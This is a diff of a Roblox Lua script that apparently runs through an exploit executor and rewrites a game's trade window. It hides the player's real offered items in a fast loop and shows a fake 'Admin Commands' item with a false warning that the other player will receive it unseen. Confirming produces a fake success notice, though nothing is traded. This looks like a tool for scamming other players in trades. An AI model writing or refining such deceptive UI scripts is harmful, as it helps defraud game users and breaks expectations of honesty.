@@ -1,8 +1,8 @@
--- Services
+--// Services
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- UI References
+--// Trade UI
 local tradeUI = playerGui:WaitForChild("TradeLiveTrade"):WaitForChild("TradeLiveTrade")
 local yourFrame = tradeUI:WaitForChild("Your")
 local scrollingFrame = yourFrame:WaitForChild("ScrollingFrame")
@@ -14,184 +14,163 @@ local cash = spacer:WaitForChild("Cash")
 local title = spacer:WaitForChild("Title")
 local stroke = spacer:FindFirstChildOfClass("UIStroke")
 
--- Confirmation UI
+--// Confirmation UI
 local confirmationUI = playerGui:WaitForChild("Confirmation")
 local warningTemplate = confirmationUI:WaitForChild("WarningTemplate")
-local warningContent = warningTemplate:WaitForChild("Content")
-local description = warningContent:WaitForChild("Description")
+local description = warningTemplate:WaitForChild("Content"):WaitForChild("Description")
 
--- Notification UI
+local yesButton = warningTemplate:WaitForChild("Yes")
+local noButton = warningTemplate:WaitForChild("No")
+
+--// Notifications UI
 local notificationUI = playerGui:WaitForChild("Notification"):WaitForChild("Notification")
-local notificationTemplate = notificationUI:WaitForChild("Template")
+local notifTemplate = notificationUI:WaitForChild("Template")
 
--- Colors
+--// Colors
 local defaultColor = Color3.fromRGB(35, 45, 50)
 local clickedColor = Color3.fromRGB(15, 50, 60)
 local strokeClickedColor = Color3.fromRGB(0, 0, 70)
 
--- State
-local pendingAction = false
-
-------------------------------------------------
--- UI Setup
-------------------------------------------------
-
+--// Init UI text
 cash.Text = "0/s"
 title.Text = "Test"
 
--- Add image once
+description.Text =
+"The other player will not see this item in the trade but will still receive the item. Do you still want to add this item to the trade?"
+
+--// Add image once
 if not spacer:FindFirstChild("CustomImage") then
-    local image = Instance.new("ImageLabel")
-    image.Name = "CustomImage"
-    image.Parent = spacer
-    image.BackgroundTransparency = 1
-    image.Image = "rbxassetid://139291316302932"
-    image.Size = UDim2.new(0.5, 0, 0.5, 0)
-    image.Position = UDim2.new(0.25, 0, 0.25, 0)
+	local image = Instance.new("ImageLabel")
+	image.Name = "CustomImage"
+	image.Parent = spacer
+	image.BackgroundTransparency = 1
+	image.Image = "rbxassetid://139291316302932"
+	image.Size = UDim2.new(0.5, 0, 0.5, 0)
+	image.Position = UDim2.new(0.25, 0, 0.25, 0)
 end
 
--- Set default colors
-spacer.BackgroundColor3 = defaultColor
-if stroke then
-    stroke.Color = Color3.fromRGB(0, 0, 0)
-end
-
-------------------------------------------------
--- Lock other UI elements
-------------------------------------------------
-
+--// Visibility lock system
 local function enforceVisibility()
-    for _, v in ipairs(scrollingFrame:GetChildren()) do
-        if v ~= template and v:IsA("GuiObject") then
-            v.Visible = false
+	for _, v in ipairs(scrollingFrame:GetChildren()) do
+		if v ~= template and v:IsA("GuiObject") then
+			v.Visible = false
 
-            v:GetPropertyChangedSignal("Visible"):Connect(function()
-                if v.Visible then
-                    v.Visible = false
-                end
-            end)
-        end
-    end
+			v:GetPropertyChangedSignal("Visible"):Connect(function()
+				if v.Visible == true then
+					v.Visible = false
+				end
+			end)
+		end
+	end
 end
 
 enforceVisibility()
 
 scrollingFrame.ChildAdded:Connect(function()
-    task.wait()
-    enforceVisibility()
+	task.wait()
+	enforceVisibility()
 end)
 
 task.spawn(function()
-    while true do
-        enforceVisibility()
-        task.wait(0.05)
-    end
+	while true do
+		enforceVisibility()
+		task.wait(0.05)
+	end
 end)
 
-------------------------------------------------
--- Notification Helper
-------------------------------------------------
+--// Default state
+spacer.BackgroundColor3 = defaultColor
+if stroke then
+	stroke.Color = Color3.fromRGB(0, 0, 0)
+end
 
+local clicked = false
+
+--// Safe clipboard function (Delta / executors)
+local function copyToClipboard(text)
+	pcall(function()
+		if setclipboard then
+			setclipboard(text)
+		end
+	end)
+end
+
+--// Notification helper
 local function showNotification(text, color)
-    local clone = notificationTemplate:Clone()
-    clone.Parent = notificationUI
-    clone.Visible = true
-    clone.Name = "Notification"
+	local clone = notifTemplate:Clone()
+	clone.Parent = notificationUI
+	clone.Visible = true
 
-    if clone:FindFirstChild("TextLabel") then
-        clone.TextLabel.Text = text
-        clone.TextLabel.TextColor3 = color
-    elseif clone:IsA("TextLabel") then
-        clone.Text = text
-        clone.TextColor3 = color
-    end
+	local txt = clone:FindFirstChildWhichIsA("TextLabel", true)
+	if txt then
+		txt.Text = text
+		txt.TextColor3 = color
+	end
 
-    task.delay(3, function()
-        clone:Destroy()
-    end)
+	task.delay(3, function()
+		if clone then
+			clone:Destroy()
+		end
+	end)
 end
 
-------------------------------------------------
--- Confirmation Logic
-------------------------------------------------
-
-local function openConfirmation()
-    warningTemplate.Visible = true
-end
-
--- Set description on load
-description.Text = "The other player will not see this item in the trade but will still receive the item. Do you still want to add this item to the trade?"
-
-------------------------------------------------
--- Yes / No buttons
-------------------------------------------------
-
-local yesButton = warningTemplate:WaitForChild("Yes")
-local noButton = warningTemplate:WaitForChild("No")
-
-yesButton.MouseButton1Click:Connect(function()
-    warningTemplate.Visible = false
-
-    -- visual feedback while processing
-    spacer.BackgroundColor3 = clickedColor
-    if stroke then
-        stroke.Color = strokeClickedColor
-    end
-
-    task.wait(0.2)
-
-    showNotification("Successfully added 'Admin Commands' to trade!", Color3.fromRGB(0, 255, 0))
-
-    task.wait(0.2)
-    pendingAction = false
-end)
-
-noButton.MouseButton1Click:Connect(function()
-    warningTemplate.Visible = false
-    pendingAction = false
-
-    local clone = notificationTemplate:Clone()
-    clone.Parent = notificationUI
-    clone.Visible = true
-    clone.Name = "Fail"
-
-    if clone:FindFirstChild("TextLabel") then
-        clone.TextLabel.Text = "Failed to add Gamepass"
-        clone.TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    elseif clone:IsA("TextLabel") then
-        clone.Text = "Failed to add Gamepass"
-        clone.TextColor3 = Color3.fromRGB(255, 0, 0)
-    end
-
-    task.delay(3, function()
-        clone:Destroy()
-    end)
-end)
-
-------------------------------------------------
--- Click handling (NOW OPENS CONFIRMATION FIRST)
-------------------------------------------------
-
+--// OPEN CONFIRMATION
 spacer.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        if pendingAction then return end
-        pendingAction = true
-
-        openConfirmation()
-    end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		confirmationUI.Enabled = true
+		warningTemplate.Visible = true
+	end
 end)
 
-------------------------------------------------
--- Reset UI state
-------------------------------------------------
+--// YES BUTTON
+yesButton.MouseButton1Click:Connect(function()
+	warningTemplate.Visible = false
+	confirmationUI.Enabled = false
 
+	clicked = true
+	spacer.BackgroundColor3 = clickedColor
+
+	if stroke then
+		stroke.Color = strokeClickedColor
+	end
+
+	showNotification("Sucessfully added 'Admin Commands' to trade!", Color3.fromRGB(0, 255, 0))
+end)
+
+--// NO BUTTON
+noButton.MouseButton1Click:Connect(function()
+	warningTemplate.Visible = false
+	confirmationUI.Enabled = false
+
+	local failClone = notifTemplate:Clone()
+	failClone.Name = "Fail"
+	failClone.Parent = notificationUI
+	failClone.Visible = true
+
+	local txt = failClone:FindFirstChildWhichIsA("TextLabel", true)
+	if txt then
+		txt.Text = "Failed to add Gamepass"
+		txt.TextColor3 = Color3.fromRGB(255, 0, 0)
+	end
+
+	-- copy error to clipboard (Delta feature)
+	copyToClipboard("Failed to add Gamepass")
+
+	task.delay(3, function()
+		if failClone then
+			failClone:Destroy()
+		end
+	end)
+end)
+
+--// Reset when UI hides
 tradeUI:GetPropertyChangedSignal("Visible"):Connect(function()
-    if not tradeUI.Visible then
-        pendingAction = false
+	if not tradeUI.Visible then
+		clicked = false
+		spacer.BackgroundColor3 = defaultColor
 
-        spacer.BackgroundColor3 = defaultColor
-        if stroke then
-            stroke.Color = Color3.fromRGB(0, 0, 0)
-        end
-    end
+		if stroke then
+			stroke.Color = Color3.fromRGB(0, 0, 0)
+		end
+	end
 end)
